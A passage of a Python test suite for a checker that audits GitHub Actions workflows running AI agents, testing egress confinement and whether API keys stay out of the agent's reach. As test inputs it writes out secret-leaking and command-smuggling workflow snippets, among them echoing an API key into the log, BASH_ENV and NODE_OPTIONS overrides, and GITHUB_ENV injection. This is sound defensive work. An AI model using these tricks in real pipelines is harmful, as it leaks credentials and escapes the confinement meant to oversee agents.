        run = "claude -p 'review'\necho '${{ env.ANTHROPIC_API_KEY }}'"
        f = self.check(keyed(run=run))
        self.assertIn("with ANTHROPIC_API_KEY given to AWF's API proxy", detail(f))

    def test_long_lists_say_how_many_more(self):
        env = {f"K{n}": f"${{{{ secrets.K{n} }}}}" for n in range(5)}
        f = self.check(keyed(model_keys=None, step_env=env, env_input=",".join(env)))
        self.assertEqual(verdict(f), VERIFIED)
        self.assertIn("secrets.K0, secrets.K1, secrets.K2 and 2 more", detail(f))

    def test_secret_findings_say_where_the_key_goes_whatever_the_verdict(self):
        for cat, expected in ((None, VERIFIED), (checker.load(), CANNOT_TELL)):
            control = secret_control(run_check(workflow(keyed()), cat=cat))
            with self.subTest(expected=expected):
                self.assertEqual(control.verdict, expected)
                self.assertIn("ANTHROPIC_API_KEY (secrets.ANTHROPIC_API_KEY) goes to AWF's API proxy, which the "
                              "command can use and cannot read", control.detail)
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        control = secret_control(run_check(workflow(keyed(model_keys=None, env_input="REVIEW_KEY", step_env=env))))
        self.assertIn("secrets.REVIEW_KEY is passed to the command as REVIEW_KEY", control.detail)
        # The egress finding's own control does not carry the routes; the secret finding's does.
        self.assertNotIn("Where the confined step's credentials go", detail(self.check(keyed())))

    def test_a_model_key_under_env_or_a_name_model_keys_does_not_take_is_not_met(self):
        """The action refuses them, so it does not run."""
        cases = {
            "a model key under env": keyed(model_keys=None, env_input="ANTHROPIC_API_KEY"),
            "under both inputs": keyed(env_input="ANTHROPIC_API_KEY"),
            "a GitHub token under env": keyed(model_keys=None, env_input="GH_TOKEN",
                                              step_env={"GH_TOKEN": "${{ github.token }}"}),
            "a provider the action has not tested": keyed(model_keys="GEMINI_API_KEY",
                                                          step_env={"GEMINI_API_KEY": "${{ secrets.G }}"}),
            "another case": keyed(model_keys="anthropic_api_key",
                                  step_env={"anthropic_api_key": "${{ secrets.A }}"}),
            "not a name": keyed(model_keys=None, env_input="'A-B'", step_env={"A-B": "${{ secrets.A }}"}),
        }
        for what, steps in cases.items():
            f = self.check(steps)
            with self.subTest(what=what):
                self.assertEqual(verdict(f), NOT_MET)
                self.assertIn("refuses to run", detail(f))

    def test_a_model_key_no_env_sets_is_not_met(self):
        f = self.check(keyed(step_env={}, run="./scripts/x.sh"))
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("no env of the step, the job or the workflow sets it", detail(f))
        # Set in the step's env under another case: the action reads names as written.
        f = self.check(keyed(step_env={"anthropic_api_key": "${{ secrets.A }}"}))
        self.assertEqual(verdict(f), NOT_MET)
        # Set in the job's env as text, or in an env computed when the job runs: not refused here.
        for job_env in ("    env: {ANTHROPIC_API_KEY: not-a-secret}", "    env: ${{ fromJSON(vars.ENV) }}"):
            f = self.check(keyed(step_env={}), job_extra=job_env)
            with self.subTest(job_env=job_env):
                self.assertNotIn("refuses to run", detail(f))

    def test_a_secret_named_under_neither_input_reaches_nothing(self):
        """It is not evidence that the agent is the confined command: with no agent the checker knows,
        it is "cannot tell", as for a job with no key at all."""
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        f = self.check(keyed(model_keys=None, step_env=env, run="./scripts/home-grown.sh"))
        self.assertEqual(verdict(f), CANNOT_TELL)
        self.assertIn("needs no key", detail(f))
        self.assertEqual(verdict(self.check(keyed(model_keys=None, step_env=env))), VERIFIED)
        control = secret_control(run_check(workflow(keyed(model_keys=None, step_env=env))))
        self.assertIn("REVIEW_KEY (secrets.REVIEW_KEY) is named under neither env nor model-keys", control.detail)

    def test_a_key_given_to_the_proxy_is_evidence_that_the_agent_is_inside(self):
        f = self.check(keyed(run="./scripts/home-grown.sh"))
        self.assertEqual(verdict(f), VERIFIED)

    def test_what_the_checker_cannot_place_is_cannot_tell(self):
        cases = {
            "model-keys computed": keyed(model_keys="'${{ vars.KEYS }}'"),
            "env computed": keyed(model_keys=None, env_input="'${{ vars.NAMES }}'",
                                  step_env={"REVIEW_KEY": "${{ secrets.R }}"}),
            "model-keys as a list": keyed(model_keys="[ANTHROPIC_API_KEY]"),
            "names differing only in case": keyed(step_env={"ANTHROPIC_API_KEY": "${{ secrets.A }}",
                                                            "Anthropic_Api_Key": "${{ secrets.B }}"}),
            "another input": keyed().replace("          allow:", "          note: '${{ secrets.X }}'\n          allow:"),
            "a computed env": keyed(step_env={}).replace(
                "        with:", "        env: ${{ fromJSON(secrets.ENV) }}\n        with:"),
            "a condition": keyed(extra="        if: github.token != ''\n"),
        }
        for what, steps in cases.items():
            f = self.check(steps)
            with self.subTest(what=what):
                self.assertEqual(verdict(f), CANNOT_TELL, detail(f))

    def test_a_credential_outside_the_confined_command_is_still_not_met(self):
        other = "      - run: gh pr view\n        env: {GH_TOKEN: '${{ github.token }}'}\n"
        f = self.check(other + keyed())
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("outside the confined command", detail(f))

    def test_the_checker_reads_names_as_the_action_does(self):
        """The checker's copy of the action's lists, kept the same by this test."""
        import importlib.util
        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        spec = importlib.util.spec_from_file_location("obaaf_egress_action_lists",
                                                      os.path.join(root, "actions", "egress", "egress.py"))
        action_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(action_mod)
        self.assertEqual(egress_mod.MODEL_KEYS, action_mod.MODEL_KEYS)
        self.assertEqual(egress_mod.WITHHELD_BY_AWF, action_mod.WITHHELD_BY_AWF)
        self.assertEqual(egress_mod.NAME_RE.pattern, action_mod._NAME_RE.pattern)


class AgentInstallTest(unittest.TestCase):
    """A step before OBAAF's egress action that only installs an agent's CLI is not taken for running
    the agent outside the confined command (flagship slice 2c.8): the patterns that recognise an agent
    match its package's name, and installing it in one step and running it confined in the next is the
    natural way to use the action. Anything more in the step and it counts, as before."""

    CONFINED = keyed(run="claude -p 'review the change'")

    def check(self, steps, cat=None, **kw):
        return egress(run_check(workflow(steps, **kw), cat=cat, config=kw.pop("config", None)))

    def install(self, script, extra=""):
        return f"      - name: Install the agent\n{extra}        run: {json.dumps(script)}\n"

    def test_an_install_before_the_action_is_not_an_agent_outside_it(self):
        for script in ("sudo npm install -g @anthropic-ai/claude-code\nclaude --version",
                       "npm i -g @anthropic-ai/claude-code@2.1.0",
                       "npm install --global @openai/codex@latest && codex --version",
                       "# the CLI the action runs\npnpm add -g @google/gemini-cli; gemini --version",
                       "sudo -E npm install -g --no-fund @anthropic-ai/claude-code @openai/codex",
                       "yarn global add @anthropic-ai/claude-code", "bun add -g @anthropic-ai/claude-code"):
            f = self.check(CHECKOUT + "\n" + self.install(script) + self.CONFINED)
            with self.subTest(script=script):
                self.assertEqual(verdict(f), VERIFIED, detail(f))

    def test_a_run_in_the_step_still_counts(self):
        for script in ("npx @anthropic-ai/claude-code -p 'fix it'",
                       "npm install -g @anthropic-ai/claude-code && claude -p 'fix it'",
                       "npm install -g @anthropic-ai/claude-code \\\n  && claude -p x",
                       "npm exec @anthropic-ai/claude-code -- -p x",
                       "npm install -g @anthropic-ai/claude-code; npx -y @openai/codex exec fix",
                       "pnpm dlx @google/gemini-cli", "bunx @anthropic-ai/claude-code",
                       # Found by the second review: a path into the package runs it.
                       "node node_modules/@anthropic-ai/claude-code/cli.js -p fix",
                       "npm i -g @anthropic-ai/claude-code\nnode /usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js"):
            f = self.check(self.install(script) + self.CONFINED)
            with self.subTest(script=script):
                self.assertEqual(verdict(f), NOT_MET, detail(f))
                self.assertIn("outside the confined command", detail(f))

    def test_a_step_it_cannot_read_as_an_install_is_cannot_tell(self):
        """Only the package's name is there, and the script is not one the checker can vouch for: the
        plan asks for "cannot tell", not a claim that the agent runs there."""
        for script in ("npm install -g @anthropic-ai/claude-code\nclaude 'fix it'",
                       "npm install -g @anthropic-ai/claude-code\nnode agent.js",
                       "npm install -g @anthropic-ai/claude-code typescript",
                       "npm install -g @anthropic-ai/claude-code-extra",
                       "npm install -g $(echo @anthropic-ai/claude-code)",
                       "npm install -g @anthropic-ai/claude-code | tee log",
                       "npm install -g @anthropic-ai/claude-code & claude --version",
                       "npm install -g @anthropic-ai/claude-code # then run it",
                       "npm install -g '@anthropic-ai/claude-code'",
                       "npm install -g --registry=https://example.com @anthropic-ai/claude-code",
                       "sudo -u root npm install -g @anthropic-ai/claude-code",
                       # Found by the review: options that take a path, a value that is a listed
                       # package's name, options alone, a local install, and sudo options that change
                       # what runs or leave it running.
                       "npm i -g --script-shell @openai/codex @anthropic-ai/claude-code",
                       "npm i -g --userconfig @openai/codex @anthropic-ai/claude-code",
                       "npm i -g --prefix @openai/codex @anthropic-ai/claude-code",
                       "npm install -g @anthropic-ai/claude-code\nnpm install --foreground-scripts",
                       "npm install -g @anthropic-ai/claude-code\npnpm install --frozen-lockfile",
                       "npm install -g @anthropic-ai/claude-code\nnpm install -g",
                       "npm install @anthropic-ai/claude-code",
                       "sudo -b npm install -g @anthropic-ai/claude-code",
                       "sudo -i npm install -g @anthropic-ai/claude-code",
                       "sudo -s npm install -g @anthropic-ai/claude-code",
                       "sudo -uroot npm install -g @anthropic-ai/claude-code"):
            f = self.check(self.install(script) + self.CONFINED)
            with self.subTest(script=script):
                self.assertEqual(verdict(f), CANNOT_TELL, detail(f))
                self.assertIn("neither an install it can vouch for nor a run", detail(f))

    def test_what_can_make_the_same_words_run_something_else_is_not_read_as_an_install(self):
        """Found by the review: the step's env, its working directory and the defaults of the job or
        the workflow can make `npm install` run code the workflow's author chose."""
        plain = "npm install -g @anthropic-ai/claude-code"
        for extra in ("        env: {BASH_ENV: ./run-agent.sh}\n", "        env: {NODE_OPTIONS: --require ./agent.js}\n",
                      "        env: {PATH: ./bin}\n", "        working-directory: tools\n"):
            f = self.check(self.install(plain, extra) + self.CONFINED)
            with self.subTest(extra=extra):
                self.assertEqual(verdict(f), CANNOT_TELL, detail(f))
        for kw in ({"job_extra": "    defaults: {run: {shell: 'env BASH_ENV=./run-agent.sh bash -e {0}'}}"},
                   {"top": "defaults: {run: {working-directory: tools}}"},
                   # Found by the second review: the env the step inherits.
                   {"job_extra": "    env: {BASH_ENV: ./run-agent.sh}"},
                   {"job_extra": "    env: {NODE_OPTIONS: --require ./agent.js}"},
                   {"top": "env: {PATH: './bin:/usr/bin:/bin'}"},
                   {"top": "env: {npm_config_script_shell: ./run-agent.sh}"}):
            f = self.check(self.install(plain) + self.CONFINED, **kw)
            with self.subTest(kw=kw):
                self.assertEqual(verdict(f), CANNOT_TELL, detail(f))

    def test_only_a_plain_shell_step_is_read(self):
        for extra in ("        shell: python\n", "        shell: bash -e {0}\n", "        background: true\n"):
            f = self.check(self.install("npm install -g @anthropic-ai/claude-code", extra) + self.CONFINED)
            with self.subTest(extra=extra):
                self.assertNotEqual(verdict(f), VERIFIED)
        script = f"      - uses: actions/github-script@{SHA}\n        with: {{script: 'npm install -g @anthropic-ai/claude-code'}}\n"
        self.assertNotEqual(verdict(self.check(script + self.CONFINED)), VERIFIED)

    def test_an_install_after_the_action_still_counts(self):
        f = self.check(self.CONFINED + "\n" + self.install("npm install -g @anthropic-ai/claude-code").rstrip("\n"))
        self.assertEqual(verdict(f), NOT_MET)
        self.assertIn("outside the confined command", detail(f))

    def test_which_jobs_are_agent_jobs_does_not_change(self):
        """A job whose only mention of an agent is the install step is still an agent job."""
        steps = self.install("npm install -g @anthropic-ai/claude-code") + "      - run: make test"
        result = run_check(workflow(steps), config={"lanes": {}})
        self.assertTrue(any(f.rule == "OBAAF-GHA-020" for f in result.findings))


class HardenRunnerTest(unittest.TestCase):
    """Harden-Runner covers the job only when four things can be established; the repository's tier
    never can be from the workflow, so it is "cannot tell" at best."""

    def monitor(self, ref=HR_2_22_0, inputs="egress-policy: block, disable-sudo-and-containers: true",
                runs_on="ubuntu-24.04", extra=""):
        steps = (f"      - uses: step-security/harden-runner@{ref}{extra}\n        with: {{{inputs}}}\n"
                 + CHECKOUT + "\n      - run: claude -p x")
        return egress(run_check(workflow(steps, runs_on=runs_on)))

    def test_a_listed_release_with_sudo_and_containers_removed_is_cannot_tell_for_the_tier(self):
        f = self.monitor()
        self.assertEqual((f.kind, verdict(f)), ("unverified-monitor", CANNOT_TELL))
        self.assertIn("free tier", detail(f))

    def test_it_is_never_verified(self):
        for ref, inputs, runs_on in itertools.product(
                (HR_2_22_0, HR_2_15_1, SHA, "v2"),
                ("egress-policy: block, disable-sudo-and-containers: true", "egress-policy: block, disable-sudo: true",
                 "egress-policy: block, disable-sudo-and-containers: 'True'"),
                ("ubuntu-24.04", "ubuntu-latest")):
            with self.subTest(ref=ref, inputs=inputs, runs_on=runs_on):
                self.assertNotEqual(verdict(self.monitor(ref=ref, inputs=inputs, runs_on=runs_on)), VERIFIED)

    def test_a_release_before_2_16_0_is_not_met(self):
        f = self.monitor(ref=HR_2_15_1)
        self.assertEqual((f.kind, verdict(f)), ("weak-monitor", NOT_MET))
        self.assertIn("v2.15.1", detail(f))

    def test_the_version_is_never_read_from_a_tag_or_a_comment(self):
        for ref, extra in ((SHA, " # v2.22.0"), ("v2.22.0", ""), ("v2", "")):
            f = self.monitor(ref=ref, extra=extra)
            with self.subTest(ref=ref, extra=extra):
                self.assertEqual(verdict(f), CANNOT_TELL)
                self.assertIn("not a commit" if ref.startswith("v") else "not a commit OBAAF lists", detail(f))

    def test_sudo_or_containers_left_to_the_job_is_not_met(self):
        for inputs, words in (("egress-policy: block", "sudo and containers are kept"),
                              ("egress-policy: block, disable-sudo: true", "containers are kept"),
                              ("egress-policy: block, disable-sudo-and-containers: false", "sudo and containers"),
                              ("egress-policy: block, disable-sudo-and-containers: 'yes'", "sudo and containers")):
            f = self.monitor(inputs=inputs)
            with self.subTest(inputs=inputs):
                self.assertEqual((f.kind, verdict(f)), ("weak-monitor", NOT_MET))
                self.assertIn(words, detail(f))
        f = self.monitor(inputs="egress-policy: block, disable-sudo-and-containers: '${{ inputs.lock }}'")
        self.assertEqual(verdict(f), CANNOT_TELL)

    def test_a_policy_from_the_policy_store_is_cannot_tell(self):
        for inputs in ("egress-policy: block, disable-sudo-and-containers: true, policy: strict",
                       "egress-policy: block, disable-sudo-and-containers: true, use-policy-store: true"):
            f = self.monitor(inputs=inputs)
            with self.subTest(inputs=inputs):
                self.assertEqual(verdict(f), CANNOT_TELL)
                self.assertIn("policy store", detail(f))

    def test_a_container_job_on_a_hosted_runner_is_not_met(self):
        """It sets up nothing in a container on a GitHub-hosted runner (src/setup.ts at v2.16.0)."""
        steps = (f"      - uses: step-security/harden-runner@{HR_2_22_0}\n"
                 "        with: {egress-policy: block, disable-sudo-and-containers: true}\n      - run: claude -p x")
        f = egress(run_check(workflow(steps, job_extra="    container: node:20")))
        self.assertEqual((f.kind, verdict(f)), ("weak-monitor", NOT_MET))
        self.assertIn("container", detail(f))

    def test_a_self_hosted_runner_is_named(self):
        self.assertIn("self-hosted", detail(self.monitor(runs_on="[self-hosted, linux]")))


class AgentWorkflowFirewallTest(unittest.TestCase):
    def awf(self, run):
        steps = f"      - uses: github/gh-aw-firewall@{SHA}\n        with: {{version: v0.29.13}}\n      - run: {json.dumps(run)}"
        return egress(run_check(workflow(steps)))

    def test_a_command_under_awf_is_cannot_tell(self):
        for run in ("sudo -E awf --allow-domains api.example.com -- claude -p x",
                    "awf --allow-domains api.example.com -- ./agent.sh", "\"$RUNNER_TEMP\"/awf-bin/awf -- make"):
            f = self.awf(run)
            with self.subTest(run=run):
                self.assertEqual((f.kind, verdict(f)), ("awf", CANNOT_TELL))

    def test_enable_dind_is_not_met(self):
        f = self.awf("sudo -E awf --enable-dind --allow-domains api.example.com -- claude -p x")
        self.assertEqual((f.kind, verdict(f)), ("awf", NOT_MET))
        # Found by the fourth review: quoting the comment remover misreads must not hide it.
        f = self.awf("printf '%s\\n' $'it\\'s #1' ; sudo awf --enable-dind --allow-domains a.example.com -- claude -p x\n"
                     "sudo awf --allow-domains a.example.com -- claude -p y")
        self.assertEqual((f.kind, verdict(f)), ("awf", NOT_MET))

    def test_the_word_in_a_string_or_a_comment_is_not_awf(self):
        for run in ("echo \"awful\"; claude -p x", "# TODO: wrap this in awf --allow-domains x --\nclaude -p x",
                    "echo awf --allow-domains x; claude -p x"):
            with self.subTest(run=run):
                self.assertEqual(self.awf(run).kind, "none")


class BestControlTest(unittest.TestCase):
    def test_one_real_control_is_enough(self):
        late = f"{CHECKOUT}\n      - uses: step-security/harden-runner@{HR_2_22_0}\n        with: {{egress-policy: block}}"
        result = run_check(workflow(late + "\n      - run: claude -p x", runs_on="ubuntu-24.04-firewall"), policy=FIREWALL)
        f = egress(result)
        self.assertEqual((f.kind, verdict(f)), ("firewall-runner", VERIFIED))

    def test_the_better_of_two_unproven_controls_stands(self):
        monitor = (f"      - uses: step-security/harden-runner@{HR_2_22_0}\n"
                   "        with: {egress-policy: block, disable-sudo-and-containers: true}\n")
        f = egress(run_check(workflow(monitor + action(allow="github.io"))))
        self.assertEqual((f.kind, verdict(f)), ("unverified-monitor", CANNOT_TELL))


class PublicSuffixTest(unittest.TestCase):
    def test_the_list_ships_both_sections(self):
        for name in ("com", "co.uk", "github.io", "workers.dev", "s3.amazonaws.com", "foo.ck"):
            with self.subTest(name=name):
                self.assertTrue(egress_mod.is_public_suffix(name))
        for name in ("github.com", "api.github.com", "example.github.io", "www.ck", "example.co.uk"):
            with self.subTest(name=name):
                self.assertFalse(egress_mod.is_public_suffix(name))

    def test_the_list_is_in_the_package(self):
        from importlib import resources
        text = resources.files("obaaf.data").joinpath("public_suffix_list.dat").read_text(encoding="utf-8")
        self.assertIn("===BEGIN PRIVATE DOMAINS===", text)
        self.assertIn("Mozilla Public", text.splitlines()[0])


class ReleaseDataTest(unittest.TestCase):
    def test_harden_runner_releases_are_commits_with_versions(self):
        releases = checker.load().detection["harden_runner_releases"]
        self.assertEqual(releases[HR_2_22_0], "2.22.0")
        for sha, version in releases.items():
            with self.subTest(sha=sha):
                self.assertRegex(sha, r"^[0-9a-f]{40}$")
                self.assertRegex(version, r"^\d+\.\d+\.\d+$")

    def test_no_commit_of_the_egress_action_is_listed_yet(self):
        self.assertEqual(checker.load().detection["egress_action_releases"], [])

    def test_listed_commits_of_the_egress_action_are_at_or_after_the_floor(self):
        """Only a commit at or after the floor may be listed: the checker reads the action's
        model-keys input and describes its resolver, both of which exist from the merge of slice 2c.4
        (slice 2c.5), and the runner's sockets in /tmp and links left in the copy are dealt with from
        slice 2c.6's last change to the action. Checked against the repository's history, which CI's
        test job fetches in full."""
        detection = checker.load().detection
        self.assertEqual(detection["egress_action_floor"], FLOOR)
        self.assertEqual(floor_problems(detection["egress_action_releases"], FLOOR), [])

    def test_the_floor_check_refuses_an_older_commit(self):
        if not has_history(FLOOR):
            self.skipTest("this checkout does not hold the repository's history (CI's test job fetches it)")
        self.assertEqual(floor_problems([FLOOR, AFTER_FLOOR], FLOOR), [])
        problems = floor_problems([BEFORE_FLOOR, "0" * 40, "v1"], FLOOR)
        self.assertEqual(len(problems), 3, problems)
        self.assertIn("not at or after", problems[0])
        self.assertEqual(lists_differ(FLOOR), "")
        self.assertEqual(lists_differ(AFTER_FLOOR), "")


FLOOR = "7c1bded84f32a86135f89dde30396a32f44de9e0"          # slice 2c.6's last change to the action
AFTER_FLOOR = "1f5fccb560c8ab33274589e81590adc4b5d9b065"    # slice 2c.6's branch, merged with 2c.5
BEFORE_FLOOR = "f0bfbd79398a5950bb3c72860e98dfdaa66c929f"   # the merge of #128, slice 2c.4: before 2c.6


def has_history(commit):
    import subprocess
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    try:
        found = subprocess.run(["git", "-C", root, "cat-file", "-e", f"{commit}^{{commit}}"],
                               capture_output=True, timeout=30)
    except (OSError, subprocess.SubprocessError):
        return False
    return found.returncode == 0


def floor_problems(releases, floor):
    """Why each listed commit may not be listed: not a full commit name, or not at or after `floor`
    in this repository's history. With commits listed and no history to check them against, that
    is a problem too: the check fails closed."""
    import subprocess
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    problems = []
    if releases and not has_history(floor):
        return [f"the repository's history is not here to check {len(releases)} listed commit(s) against {floor[:12]}"]
    for sha in releases:
        if not isinstance(sha, str) or not __import__("re").fullmatch(r"[0-9a-f]{40}", sha):
            problems.append(f"{sha!r} is not a full commit name")
            continue
        try:
            found = subprocess.run(["git", "-C", root, "merge-base", "--is-ancestor", floor, sha],
                                   capture_output=True, timeout=30)
        except (OSError, subprocess.SubprocessError) as exc:
            problems.append(f"{sha[:12]} could not be checked ({exc})")
            continue
        if found.returncode != 0:
            problems.append(f"{sha[:12]} is not at or after {floor[:12]}, the floor (slice 2c.6's last change to the action)")
            continue
        differs = lists_differ(sha)
        if differs:
            problems.append(f"{sha[:12]}: {differs}")
    return problems


def lists_differ(sha):
    """How the action at `sha` reads its inputs differently from the checker's copy of its lists
    (found by the first review: the floor alone would let a later commit that changed them be listed),
    or an empty string."""
    import importlib.util
    import subprocess
    import tempfile
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    try:
        shown = subprocess.run(["git", "-C", root, "show", f"{sha}:actions/egress/egress.py"],
                               capture_output=True, timeout=30)
    except (OSError, subprocess.SubprocessError) as exc:
        return f"its egress.py could not be read ({exc})"
    if shown.returncode != 0:
        return "it has no actions/egress/egress.py"
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "egress_at_commit.py")
        with open(path, "wb") as handle:
            handle.write(shown.stdout)
        spec = importlib.util.spec_from_file_location("obaaf_egress_at_commit", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
    for name, mine in (("MODEL_KEYS", egress_mod.MODEL_KEYS), ("WITHHELD_BY_AWF", egress_mod.WITHHELD_BY_AWF)):
        if getattr(module, name, None) != mine:
            return f"its {name} is not the checker's"
    if getattr(getattr(module, "_NAME_RE", None), "pattern", None) != egress_mod.NAME_RE.pattern:
        return "its _NAME_RE is not the checker's"
    # How it reads the two inputs, and which inputs it has, against the floor: a change there means the
    # checker must be looked at again before the commit is listed (found by the second review).
    for what, mine, floor in ((f"{sha}:actions/egress/egress.py", None, f"{FLOOR}:actions/egress/egress.py"),
                              (f"{sha}:actions/egress/action.yml", None, f"{FLOOR}:actions/egress/action.yml")):
        if reading(what) != reading(floor):
            return f"{what.split(':', 1)[1]} reads its inputs differently from the floor's"
    return ""


def reading(spec):
    """Part of what decides how the action reads `env` and `model-keys`, in one file at one commit:
    the two parsing functions of egress.py, as syntax trees (a docstring counts), or the input names
    of action.yml. Not compared: what `run()` does with what they return, or how action.yml wires the
    inputs to the script; the escape tests a commit must pass before it is listed cover those."""
    import ast
    import subprocess
    import yaml
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    shown = subprocess.run(["git", "-C", root, "show", spec], capture_output=True, timeout=30)
    if shown.returncode != 0:
        return None
    text = shown.stdout.decode("utf-8")
    if spec.endswith(".yml"):
        return sorted((yaml.safe_load(text) or {}).get("inputs", {}))
    tree = ast.parse(text)
    return [ast.dump(node) for node in tree.body
            if isinstance(node, ast.FunctionDef) and node.name in ("parse_env_names", "parse_model_keys")]



def secret_finding(result):
    found = [f for f in result.findings if f.rule == "OBAAF-GHA-005"]
    assert len(found) == 1, [(f.rule, f.kind, f.message) for f in result.findings]
    return found[0]


def key_control(result):
    return next(c for c in secret_finding(result).controls if c.id == "key-out-of-reach")


class KeyOutOfReachTest(unittest.TestCase):
    """OBAAF-GHA-005's fifth control (flagship slice 2c.7): whether the agent's command can read the
    job's secrets. A key the agent can read can leave in the job's log or an artifact whatever the
    network allows, so only a key the command cannot read is out of that reach. Today the checker can
    establish that for one arrangement only: OBAAF's egress action, at a listed commit, on the runner
    it was tested on, with every secret of the job set in its step's env and named in `model-keys`
    (or in neither input)."""

    def key(self, steps, cat=None, config=None, **kw):
        return key_control(run_check(workflow(steps, **kw), cat=cat, config=config))

    def test_a_model_key_given_to_the_proxy_at_a_listed_commit_is_out_of_reach(self):
        control = self.key(CHECKOUT + "\n" + keyed())
        self.assertEqual(control.verdict, VERIFIED)
        self.assertIn("the command can use a key the proxy holds and cannot read it", control.detail)
        self.assertIn("ANTHROPIC_API_KEY (secrets.ANTHROPIC_API_KEY) goes to AWF's API proxy", control.detail)
        # What is still true of a key behind the proxy is said beside the verdict.
        self.assertIn("The step's own process holds each key outside the sandbox", control.detail)
        self.assertIn("by the words in their scripts", control.detail)
        self.assertIn("what an accepted install's own scripts do", control.detail)
        self.assertIn("make the provider act for it", control.detail)

    def test_no_listed_commit_or_a_tag_is_cannot_tell(self):
        control = self.key(keyed(), cat=checker.load())
        self.assertEqual(control.verdict, CANNOT_TELL)
        self.assertIn("not a commit OBAAF lists as released (none listed)", control.detail)
        self.assertIn("goes to AWF's API proxy", control.detail)     # where the key goes, whatever the verdict
        control = self.key(keyed(ref="v1"))
        self.assertEqual(control.verdict, CANNOT_TELL)
        self.assertIn("'v1', not a commit", control.detail)

    def test_a_key_passed_to_the_command_is_not_met(self):
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        cases = {
            "under env": keyed(model_keys=None, env_input="REVIEW_KEY", step_env=env),
            "written into run": keyed(run="claude -p 'review' --key '${{ secrets.ANTHROPIC_API_KEY }}'"),
            "written into run through env": keyed(run="claude -p 'review'\necho '${{ env.ANTHROPIC_API_KEY }}'"),
        }
        for name, steps in cases.items():
            control = self.key(steps)
            with self.subTest(name):
                self.assertEqual(control.verdict, NOT_MET)
                self.assertIn("so the agent can read it", control.detail)
                self.assertIn("log or an artifact whatever the network allows", control.detail)
        # The egress control itself is still verified for the first: the network is limited (D-052).
        f = egress(run_check(workflow(cases["under env"])))
        self.assertEqual(verdict(f), VERIFIED)

    def test_githubs_native_firewall_holds_no_key(self):
        steps = "      - run: python -m agents.fix\n        env: {KEY: '${{ secrets.MODEL_API_KEY }}'}"
        result = run_check(workflow(steps, runs_on="ubuntu-24.04-firewall"), policy=FIREWALL)
        secret = secret_finding(result)
        verdicts = {c.id: c.verdict for c in secret.controls}
        self.assertEqual((verdicts["egress-enforced"], verdicts["key-out-of-reach"]), (VERIFIED, NOT_MET))
        self.assertIn("GitHub's native egress firewall limits the network and holds no key",
                      key_control(result).detail)
        self.assertEqual(secret.state, "new")

    def test_a_job_with_no_confined_command_is_not_met(self):
        steps = "      - run: python -m agents.fix\n        env: {KEY: '${{ secrets.MODEL_API_KEY }}'}"
        control = self.key(steps)
        self.assertEqual(control.verdict, NOT_MET)
        self.assertIn("no step of the job runs the agent's command behind a proxy", control.detail)
        self.assertNotIn("native", control.detail)

    def test_a_secret_anywhere_else_in_the_job_is_not_met(self):
        cases = {
            "another step": CHECKOUT + "\n      - run: ./deploy.sh\n        env: {T: '${{ secrets.DEPLOY_TOKEN }}'}\n"
                            + keyed(),
            "the job's env": dict(steps=keyed(step_env={}),
                                  job_extra="    env: {ANTHROPIC_API_KEY: '${{ secrets.ANTHROPIC_API_KEY }}'}"),
            "the workflow's env": dict(steps=keyed(step_env={}),
                                       top="env: {ANTHROPIC_API_KEY: '${{ secrets.ANTHROPIC_API_KEY }}'}"),
            "the job's if": dict(steps=keyed(), job_extra="    if: secrets.OTHER != ''"),
        }
        for name, case in cases.items():
            control = self.key(**case) if isinstance(case, dict) else self.key(case)
            with self.subTest(name):
                self.assertEqual(control.verdict, NOT_MET)
                self.assertIn("outside the command the egress action confines", control.detail)

    def test_a_secret_set_in_the_step_and_named_in_neither_input_is_out_of_reach(self):
        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
        control = self.key(keyed(model_keys=None, step_env=env))
        self.assertEqual(control.verdict, VERIFIED)
        self.assertIn("REVIEW_KEY (secrets.REVIEW_KEY) is named under neither env nor model-keys", control.detail)

    def test_what_the_step_that_holds_the_key_could_load_is_cannot_tell(self):
        """The action's own steps hold the key outside the sandbox. A BASH_ENV would be loaded by its
        bash steps there (issue #139), and a process an earlier step leaves running runs as the same
        user; the checker reads neither to the end."""
        cases = {
            "BASH_ENV in the job's env": dict(steps=keyed(), job_extra="    env: {BASH_ENV: ./setup.sh}"),
            "bash_env in the step's env": dict(steps=keyed(step_env={
                "ANTHROPIC_API_KEY": "${{ secrets.ANTHROPIC_API_KEY }}", "bash_env": "./x"})),
            "BASH_ENV written by an earlier step": dict(
                steps="      - run: echo \"BASH_ENV=$PWD/x\" >> \"$GITHUB_ENV\"\n" + keyed()),
            "the job's env computed": dict(steps=keyed(), job_extra="    env: ${{ fromJSON(vars.ENV) }}"),
            "a process left running": dict(steps="      - run: nohup ./server.sh\n" + keyed()),
        }
        for name, case in cases.items():
            control = self.key(**case)
            with self.subTest(name):
                self.assertEqual(control.verdict, CANNOT_TELL, control.detail)
        self.assertIn("issue #139", self.key(**cases["BASH_ENV in the job's env"]).detail)
        self.assertIn("may leave a process running (nohup) as the same user",
                      self.key(**cases["a process left running"]).detail)

    def test_runners_the_proxy_was_not_tried_on_are_cannot_tell(self):
        for kw in ({"runs_on": "ubuntu-latest"}, {"job_extra": "    container: node:20"}):
            with self.subTest(**kw):
                self.assertEqual(self.key(keyed(), **kw).verdict, CANNOT_TELL)

    def test_awf_from_a_script_and_a_reusable_workflow_are_cannot_tell(self):
        steps = ("      - run: sudo awf --allow-domains api.example.com -- claude -p review\n"
                 "        env: {ANTHROPIC_API_KEY: '${{ secrets.ANTHROPIC_API_KEY }}'}")
        self.assertEqual(self.key(steps).verdict, CANNOT_TELL)
        text = ("on: workflow_dispatch\npermissions: {}\njobs:\n  agent:\n"
                "    uses: ./.github/workflows/called.yml\n    secrets: {KEY: '${{ secrets.MODEL_API_KEY }}'}\n")
        control = key_control(run_check(text))
